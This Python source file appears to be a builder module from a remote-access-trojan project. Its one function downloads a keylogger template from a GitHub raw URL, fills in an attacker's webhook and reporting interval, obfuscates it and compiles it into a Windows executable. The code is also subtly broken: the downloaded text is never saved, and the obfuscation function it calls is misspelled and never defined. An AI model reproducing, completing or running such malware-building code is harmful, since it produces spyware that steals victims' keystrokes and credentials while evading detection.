import os, shutil, requests
from cookies_package import *
from util.plugins.common import clear, cleanup, compile
from colorama import Fore


fileName = "Keylogger_add_on"

def Create_KeyLogger(webhook, intervals):
    clear()
    try:
        r = requests.get("https://raw.githubusercontent.com/Callumgm/Cookies_RAT/master/builder/assets/keylogger_addon.py").text.replace("WEBHOOK_URL_HERE", webhook).replace("INTERVALS_HERE", intervals)
        obfusacate(f"{fileName}.py")   # Obfuscate the file

        compile(fileName)   # Compile the file to executable
        shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")   # Move the executable from dist folder to the current directory
        cleanup(fileName)   # Cleanup the files

    except Exception as e:
        print(f'{Fore.LIGHTRED_EX}Error while making exe{Fore.RESET}: {e}')
        cleanup(fileName)   # Cleanup the files
        input(f'\n\n{Fore.RESET}[{Fore.YELLOW}>>>{Fore.RESET}] {Fore.CYAN}Enter anything to continue {Fore.RESET}. . .')

    print(f"\n{Fore.GREEN}Finshed creating keylogger add on{Fore.RESET}\n")
    input(f'{Fore.RESET}[{Fore.YELLOW}>>>{Fore.RESET}] {Fore.CYAN}Enter anything to continue {Fore.RESET}. . .')